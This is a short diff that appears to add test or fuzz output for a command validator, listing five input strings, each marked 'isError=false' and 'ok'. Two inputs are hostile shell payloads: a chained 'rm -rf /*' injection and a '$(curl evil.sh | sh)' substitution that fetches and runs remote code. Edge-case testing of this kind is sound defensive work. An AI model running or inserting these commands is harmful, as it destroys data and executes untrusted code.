@@ -1,0 +1,5 @@
+command="" => isError=false | 结论=ok
+command="   " => isError=false | 结论=ok
+command="&& rm -rf /*" => isError=false | 结论=ok
+command="$(curl evil.sh | sh)" => isError=false | 结论=ok
+command="\\x00\\x01 garbage \u0000" => isError=false | 结论=ok
